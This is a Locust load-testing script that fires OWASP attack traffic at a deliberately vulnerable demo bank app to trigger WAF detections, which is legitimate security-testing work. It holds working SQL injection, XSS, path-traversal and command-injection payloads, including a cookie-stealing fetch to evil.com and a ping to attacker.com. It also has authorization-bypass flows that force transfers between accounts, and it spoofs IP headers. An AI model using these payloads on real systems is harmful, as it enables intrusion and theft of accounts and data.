"""
vuln-bank Attack Traffic Generator
====================================
Simulates OWASP attack traffic against the vuln-bank application through F5 XC.
Designed to trigger WAF security events, bot signals, and API threat detection.

Attack categories:
  - SQL Injection (SQLi)
  - Cross-Site Scripting (XSS)
  - Path Traversal / LFI
  - Command Injection / RCE
  - Prototype Pollution
  - BOLA (Broken Object Level Authorization) — john & franklin cross-access
  - BOPLA (Broken Object Property Level Authorization) — privilege escalation fields

Workflow 1 - UnauthAttackUser : Unauthenticated attack flows on public endpoints
Workflow 2 - AuthAttackUser   : Authenticated attacks + BOLA + BOPLA

Run examples:
  locust -f locust-attack.py --host=https://vulnbank.yourdomain.com --users 50 --spawn-rate 5
  locust -f locust-attack.py --host=https://vulnbank.yourdomain.com --headless --users 50 --spawn-rate 5 --run-time 240h
  locust -f locust-attack.py --host=https://vulnbank.yourdomain.com --headless --users 50 --spawn-rate 5
"""

import random

from locust import HttpUser, between, task
from locust.exception import StopUser


# ──────────────────────────────────────────────────────────────
# Spoofed identity pools
# ──────────────────────────────────────────────────────────────

PUBLIC_IPS = [
    "23.14.89.201",  "34.110.174.22",  "45.33.32.156",  "52.15.72.219",
    "54.241.24.25",  "63.142.250.198", "66.165.240.10",  "68.183.44.42",
    "69.89.31.226",  "74.125.136.113", "76.76.21.21",    "81.169.145.149",
    "84.38.184.130", "91.189.91.157",  "103.21.244.0",   "12.34.56.78",
    "23.45.67.89",   "34.56.78.90",    "45.67.89.01",    "56.78.90.12",
    "77.23.45.67",   "80.34.56.78",    "82.45.67.89",    "83.56.78.90",
    "101.89.01.23",  "103.90.12.34",   "110.12.34.56",   "112.34.56.78",
    "177.67.89.01",  "186.90.12.34",
]

USER_AGENTS = [
    # Legitimate-looking browsers (to blend in)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0",
    # Tool-like agents (common in real attacks)
    "curl/7.85.0",
    "PostmanRuntime/7.32.0",
    "python-requests/2.31.0",
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

# ──────────────────────────────────────────────────────────────
# Attack payload libraries
# ──────────────────────────────────────────────────────────────

SQLI_PARAMS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "admin'--",
    "' OR 1=1--",
    "1 AND 1=1",
    "1; DROP TABLE users;--",
    "1 UNION SELECT null,null,null--",
    "' UNION SELECT username,password,null FROM users--",
    "1' AND SLEEP(3)--",
    "' OR SLEEP(3)--",
]

SQLI_BODY_FIELDS = [
    {"username": "admin'--",             "password": "anything"},
    {"username": "' OR '1'='1' --",      "password": "x"},
    {"username": "' OR 1=1--",           "password": "x"},
    {"username": "admin' #",             "password": "x"},
    {"username": "' UNION SELECT 1--",   "password": "x"},
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('xss')>",
    "<svg/onload=alert('xss')>",
    "<iframe src='javascript:alert(1)'>",
    "javascript:alert(document.cookie)",
    "<body onload=alert('xss')>",
    "\"><script>fetch('https://evil.com?c='+document.cookie)</script>",
    "<input autofocus onfocus=alert(1)>",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%2F..%2F..%2Fsecret.txt",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
]

CMD_INJECTION_PAYLOADS = [
    ";cat /etc/passwd",
    ";whoami",
    "127.0.0.1;whoami",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    ";ls -la /",
    "& ping -c 1 attacker.com &",
]

PROTO_POLLUTION_PAYLOADS = [
    {"__proto__": {"admin": True}},
    {"__proto__": {"role": "admin"}},
    {"constructor": {"prototype": {"admin": True}}},
    {"__proto__": {"isAdmin": True, "polluted": True}},
]


def pick_identity() -> tuple:
    return random.choice(PUBLIC_IPS), random.choice(USER_AGENTS)


def _build_headers(ip: str, ua: str, token: str = None) -> dict:
    h = {
        "X-Forwarded-For": ip,
        "User-Agent":      ua,
        "Content-Type":    "application/json",
        "Accept":          "application/json",
    }
    if token:
        h["Authorization"] = f"Bearer {token}"
    return h


# ──────────────────────────────────────────────────────────────
# Workflow 1 – Unauthenticated Attack User
# ──────────────────────────────────────────────────────────────

class UnauthAttackUser(HttpUser):
    """
    Simulates unauthenticated attack traffic against public endpoints.
    Covers SQLi on login, XSS probing, path traversal, and command injection.
    """

    wait_time = between(2, 8)

    def on_start(self):
        self.ip, self.ua = pick_identity()

    def _h(self) -> dict:
        return _build_headers(self.ip, self.ua)

    # ── SQLi on Login ─────────────────────────────────────────

    @task(5)
    def sqli_login(self):
        payload = random.choice(SQLI_BODY_FIELDS)
        self.client.post(
            "/login",
            json=payload,
            headers=self._h(),
            name="[SQLi] Login",
            catch_response=True,
        ).close()

    # ── SQLi via GET query params on public endpoints ──────────

    @task(4)
    def sqli_get_params(self):
        sqli = random.choice(SQLI_PARAMS)
        target = random.choice([
            f"/api/transactions?account_number={sqli}",
            f"/api/billers/by-category/{sqli}",
            f"/debug/users?user={sqli}",
        ])
        self.client.get(
            target,
            headers=self._h(),
            name="[SQLi] GET Params",
            catch_response=True,
        ).close()

    # ── XSS probe on public endpoints ─────────────────────────

    @task(3)
    def xss_probe(self):
        xss = random.choice(XSS_PAYLOADS)
        target = random.choice([
            f"/login?next={xss}",
            f"/api/docs?search={xss}",
            f"/blog?tag={xss}",
        ])
        self.client.get(
            target,
            headers=self._h(),
            name="[XSS] Probe",
            catch_response=True,
        ).close()

    # ── Path Traversal ────────────────────────────────────────

    @task(3)
    def path_traversal(self):
        payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
        target = random.choice([
            f"/transactions/{payload}",
            f"/api/docs?doc={payload}",
            f"/check_balance/{payload}",
        ])
        self.client.get(
            target,
            headers=self._h(),
            name="[PathTraversal] GET",
            catch_response=True,
        ).close()

    # ── Command Injection ─────────────────────────────────────

    @task(2)
    def command_injection(self):
        payload = random.choice(CMD_INJECTION_PAYLOADS)
        target = random.choice([
            f"/debug/users?host={payload}",
            f"/api/docs?file={payload}",
            f"/lookup?ip={payload}",
        ])
        self.client.get(
            target,
            headers=self._h(),
            name="[CmdInjection] GET",
            catch_response=True,
        ).close()

    # ── Prototype Pollution via POST ──────────────────────────

    @task(2)
    def proto_pollution_login(self):
        payload = random.choice(PROTO_POLLUTION_PAYLOADS)
        body = {**payload, "username": "admin", "password": "admin"}
        self.client.post(
            "/login",
            json=body,
            headers=self._h(),
            name="[ProtoPollution] Login",
            catch_response=True,
        ).close()


# ──────────────────────────────────────────────────────────────
# Workflow 2 – Authenticated Attack User (BOLA + BOPLA + OWASP)
# ──────────────────────────────────────────────────────────────

class AuthAttackUser(HttpUser):
    """
    Logs in as john or franklin, then performs authenticated attack flows:
    - OWASP attacks injected into authenticated API requests
    - BOLA: uses own token to access the OTHER user's objects (accounts, cards, profile)
    - BOPLA: sends privilege-escalation fields in POST bodies
    """

    wait_time = between(2, 8)

    # john and franklin — known demo credentials
    USER_POOL = [
        {"username": "john",     "password": "123456"},
        {"username": "franklin", "password": "123456"},
    ]

    def on_start(self):
        self.token              = None
        self.account_number     = None
        self.user_id            = None
        self.other_account      = None   # BOLA target: the OTHER user's account
        self.other_user_id      = None   # BOLA target: the OTHER user's user_id
        self.other_card_id      = None   # BOLA target: the OTHER user's card id

        self.ip, self.ua = pick_identity()

        # Pick one user; derive the other
        cred = random.choice(self.USER_POOL)
        self.username = cred["username"]
        other_cred = next(c for c in self.USER_POOL if c["username"] != self.username)

        # Login as self
        res = self.client.post(
            "/login",
            json=cred,
            headers=_build_headers(self.ip, self.ua),
            name="[Setup] Login (self)",
        )
        if res.status_code != 200:
            raise StopUser()

        body = res.json()
        self.token          = body.get("token")
        self.account_number = body.get("accountNumber")
        self.user_id        = body.get("debug_info", {}).get("user_id")

        if not self.token:
            raise StopUser()

        # Login as the OTHER user (catch_response so it doesn't count as failure)
        # We only need their account number and user_id for BOLA attacks
        other_res = self.client.post(
            "/login",
            json=other_cred,
            headers=_build_headers(self.ip, self.ua),
            name="[Setup] Login (BOLA target)",
            catch_response=True,
        )
        with other_res as r:
            if r.status_code == 200:
                other_body           = r.json()
                self.other_account   = other_body.get("accountNumber")
                self.other_user_id   = other_body.get("debug_info", {}).get("user_id")
            r.success()

    def _h(self, token: str = None) -> dict:
        return _build_headers(self.ip, self.ua, token or self.token)

    # ──────────────────────────────────────────────────────────
    # BOLA — Broken Object Level Authorization
    # Access another user's resources using own valid token
    # ──────────────────────────────────────────────────────────

    @task(6)
    def bola_check_other_balance(self):
        """Access the other user's balance using own token."""
        if not self.other_account:
            return
        self.client.get(
            f"/check_balance/{self.other_account}",
            headers=self._h(),
            name="[BOLA] Check Other User Balance",
            catch_response=True,
        ).close()

    @task(5)
    def bola_view_other_transactions(self):
        """Read the other user's transaction history using own token."""
        if not self.other_account:
            return
        target = random.choice([
            f"/transactions/{self.other_account}",
            f"/api/transactions?account_number={self.other_account}",
        ])
        self.client.get(
            target,
            headers=self._h(),
            name="[BOLA] View Other User Transactions",
            catch_response=True,
        ).close()

    @task(4)
    def bola_view_other_profile(self):
        """Access the other user's profile using own token."""
        if not self.other_user_id:
            return
        self.client.get(
            f"/api/v3/user/{self.other_user_id}",
            headers=self._h(),
            name="[BOLA] View Other User Profile",
            catch_response=True,
        ).close()

    @task(4)
    def bola_transfer_to_own_account(self):
        """Transfer from the other user's account to own account using own token."""
        if not self.other_account or not self.account_number:
            return
        self.client.post(
            "/transfer",
            json={
                "to_account":  self.account_number,
                "amount":      500.00,
                "description": "BOLA forced transfer",
            },
            headers=self._h(),
            name="[BOLA] Transfer From Other Account",
            catch_response=True,
        ).close()

    @task(3)
    def bola_view_other_virtual_cards(self):
        """Try to enumerate the other user's virtual cards."""
        if not self.other_user_id:
            return
        # Brute-force card IDs around a plausible range
        card_id = random.randint(1, 50)
        for path in [
            f"/api/virtual-cards/{card_id}/transactions",
            f"/api/virtual-cards/{card_id}/fund",
        ]:
            self.client.get(
                path,
                headers=self._h(),
                name="[BOLA] Other User Card Access",
                catch_response=True,
            ).close()

    @task(3)
    def bola_view_other_bill_payments(self):
        """Read the other user's bill payment history using own token."""
        self.client.get(
            "/api/bill-payments/history",
            headers=self._h(),
            name="[BOLA] Other User Bill Payment History",
            catch_response=True,
        ).close()

    # ──────────────────────────────────────────────────────────
    # BOPLA — Broken Object Property Level Authorization
    # Inject privilege-escalation fields into normal request bodies
    # ──────────────────────────────────────────────────────────

    @task(4)
    def bopla_escalate_transfer(self):
        """Inject admin/override fields into a transfer request."""
        if not self.account_number or not self.other_account:
            return
        self.client.post(
            "/transfer",
            json={
                "to_account":         self.other_account,
                "amount":             9999999.99,
                "description":        "BOPLA test",
                "is_admin":           True,
                "bypass_limit":       True,
                "override_balance":   True,
                "approved":           True,
            },
            headers=self._h(),
            name="[BOPLA] Transfer Privilege Escalation",
            catch_response=True,
        ).close()

    @task(3)
    def bopla_escalate_loan(self):
        """Request a loan with hidden privilege-escalation fields."""
        self.client.post(
            "/request_loan",
            json={
                "amount":       9999999.99,
                "approved":     True,
                "admin":        True,
                "role":         "admin",
                "auto_approve": True,
            },
            headers=self._h(),
            name="[BOPLA] Loan Privilege Escalation",
            catch_response=True,
        ).close()

    @task(3)
    def bopla_escalate_virtual_card(self):
        """Create a virtual card with admin override fields."""
        self.client.post(
            "/api/virtual-cards/create",
            json={
                "card_limit":   9999999.99,
                "card_type":    "premium",
                "currency":     "USD",
                "is_admin":     True,
                "no_limit":     True,
                "owner_id":     self.other_user_id or 1,
                "role":         "admin",
            },
            headers=self._h(),
            name="[BOPLA] Virtual Card Privilege Escalation",
            catch_response=True,
        ).close()

    @task(2)
    def bopla_profile_role_escalation(self):
        """Upload profile picture URL with privilege-escalation fields."""
        self.client.post(
            "/upload_profile_picture_url",
            json={
                "image_url": "https://picsum.photos/200",
                "role":      "admin",
                "is_admin":  True,
                "user_id":   self.other_user_id or 1,
            },
            headers=self._h(),
            name="[BOPLA] Profile Role Escalation",
            catch_response=True,
        ).close()

    @task(2)
    def bopla_bill_payment_escalation(self):
        """Submit a bill payment with free-payment and admin override fields."""
        self.client.post(
            "/api/bill-payments/create",
            json={
                "biller_id":      1,
                "amount":         9999999.99,
                "payment_method": "balance",
                "free":           True,
                "admin_override": True,
                "approved":       True,
                "description":    "BOPLA free payment",
            },
            headers=self._h(),
            name="[BOPLA] Bill Payment Escalation",
            catch_response=True,
        ).close()

    # ──────────────────────────────────────────────────────────
    # Authenticated OWASP Attacks
    # ──────────────────────────────────────────────────────────

    @task(4)
    def sqli_authenticated_params(self):
        """Inject SQLi payloads into authenticated GET endpoints."""
        sqli = random.choice(SQLI_PARAMS)
        target = random.choice([
            f"/api/transactions?account_number={sqli}",
            f"/check_balance/{sqli}",
            f"/transactions/{sqli}",
            f"/api/v3/user/{sqli}",
            f"/api/billers/by-category/{sqli}",
        ])
        self.client.get(
            target,
            headers=self._h(),
            name="[SQLi] Authenticated GET",
            catch_response=True,
        ).close()

    @task(3)
    def sqli_authenticated_body(self):
        """Inject SQLi payloads into authenticated POST request bodies."""
        sqli = random.choice(SQLI_PARAMS)
        target, body = random.choice([
            ("/transfer",              {"to_account": sqli, "amount": 0.01, "description": "test"}),
            ("/request_loan",          {"amount": sqli}),
            ("/api/bill-payments/create", {"biller_id": sqli, "amount": 1.0, "payment_method": "balance"}),
        ])
        self.client.post(
            target,
            json=body,
            headers=self._h(),
            name="[SQLi] Authenticated POST Body",
            catch_response=True,
        ).close()

    @task(3)
    def xss_authenticated(self):
        """Inject XSS payloads into authenticated POST body fields."""
        xss = random.choice(XSS_PAYLOADS)
        target, body = random.choice([
            ("/transfer",                 {"to_account": self.other_account or "1", "amount": 0.01, "description": xss}),
            ("/api/bill-payments/create", {"biller_id": 1, "amount": 1.0, "payment_method": "balance", "description": xss}),
            ("/upload_profile_picture_url", {"image_url": xss}),
            ("/api/virtual-cards/create", {"card_limit": 100, "card_type": xss, "currency": "USD"}),
        ])
        self.client.post(
            target,
            json=body,
            headers=self._h(),
            name="[XSS] Authenticated POST",
            catch_response=True,
        ).close()

    @task(2)
    def path_traversal_authenticated(self):
        """Inject path traversal payloads into authenticated endpoints."""
        payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
        target = random.choice([
            f"/transactions/{payload}",
            f"/check_balance/{payload}",
            f"/api/virtual-cards/{payload}/transactions",
        ])
        self.client.get(
            target,
            headers=self._h(),
            name="[PathTraversal] Authenticated GET",
            catch_response=True,
        ).close()

    @task(2)
    def command_injection_authenticated(self):
        """Inject command payloads into authenticated POST body fields."""
        payload = random.choice(CMD_INJECTION_PAYLOADS)
        target, body = random.choice([
            ("/upload_profile_picture_url", {"image_url": payload}),
            ("/transfer",                   {"to_account": self.account_number, "amount": 0.01, "description": payload}),
        ])
        self.client.post(
            target,
            json=body,
            headers=self._h(),
            name="[CmdInjection] Authenticated POST",
            catch_response=True,
        ).close()

    @task(2)
    def proto_pollution_authenticated(self):
        """Inject prototype pollution payloads into authenticated POST bodies."""
        pollution = random.choice(PROTO_POLLUTION_PAYLOADS)
        target, base_body = random.choice([
            ("/api/virtual-cards/create",   {"card_limit": 100, "card_type": "standard", "currency": "USD"}),
            ("/transfer",                   {"to_account": self.other_account or "1", "amount": 0.01, "description": "test"}),
            ("/api/bill-payments/create",   {"biller_id": 1, "amount": 1.0, "payment_method": "balance"}),
        ])
        body = {**base_body, **pollution}
        self.client.post(
            target,
            json=body,
            headers=self._h(),
            name="[ProtoPollution] Authenticated POST",
            catch_response=True,
        ).close()

    @task(2)
    def graphql_injection(self):
        """Inject malicious GraphQL queries to probe schema and data."""
        payloads = [
            {"query": "{ __schema { types { name kind fields { name } } } }"},
            {"query": "{ __type(name: \"User\") { fields { name type { name } } } }"},
            {"query": "{ transactionSummary(limit: 9999999) { totalVolume } }"},
            {"query": "mutation { deleteUser(id: 1) { success } }"},
            {"query": "{ users { id username password token } }"},
        ]
        self.client.post(
            "/graphql",
            json=random.choice(payloads),
            headers=self._h(),
            name="[GraphQL] Injection",
            catch_response=True,
        ).close()
